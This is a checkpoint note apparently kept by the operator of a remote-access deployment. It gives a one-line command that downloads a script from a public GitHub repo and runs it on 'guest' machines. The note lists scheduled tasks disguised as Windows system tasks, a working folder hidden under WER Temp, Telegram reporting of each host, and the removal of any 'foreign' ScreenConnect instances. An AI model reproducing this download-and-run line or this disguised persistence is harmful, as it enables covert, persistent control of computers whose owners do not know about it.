# CHECKPOINT — 2026-08-02

## Flatten note
All project files live under `C:\Users\nobuddy\Desktop\Project` (github-drop contents at root + `WindowsPin\` nested local repo).

## Current deploy
- **own.cmd O6** — `20260802O6` + monitor `own_mon.cmd` `20260802M4` + `tg_report.ps1` `20260802T4`
- First deploy sends Telegram **DEPLOY** report (host/SC/RMM/persist-task health)
- Auto-writes `%ProgramData%\...\ .wucache\notify.cfg` if missing (do **not** commit `notify.cfg` as a tracked file)
- Keep FPs: `5f6010579852e507` + `f861c8140d453427`
- Order: ensure primary RUNNING, then nuke foreign SC

## Preferred Guest command
```
curl.exe -L --ssl-no-revoke -o "%TEMP%\own.txt" "https://raw.githubusercontent.com/xnobuddy/github-drop/main/own.txt" && copy /y "%TEMP%\own.txt" "%TEMP%\own.cmd" >nul && "%TEMP%\own.cmd"
```

## Persist (after O6)
- `\Microsoft\Windows\Diagnosis\Scheduled` — every **2 min**
- `\Microsoft\Windows\PLA\Server` — every **3 min** (backup path)
- `\Microsoft\Windows\WDI\ResolutionHost` — ONSTART
- `\Microsoft\Windows\Tcpip\IpAddressConflict1` — ONLOGON

## After detach — wait ~60s then verify
```
type "%ProgramData%\Microsoft\Windows\WER\Temp\.wucache\boot.err"
sc query state= all | findstr /I ScreenConnect
```
Expect Telegram @nobuddyrmmBot message with deploy verdict.

## Key paths
| What | Path |
|------|------|
| Project root | `C:\Users\nobuddy\Desktop\Project\` |
| WorkDir | `%ProgramData%\Microsoft\Windows\WER\Temp\.wucache` |
| Public drop | https://github.com/xnobuddy/github-drop |

## Next
Re-run own.cmd on guests to arm persist + get DEPLOY telegram; monitor pulls updates from repo thereafter.
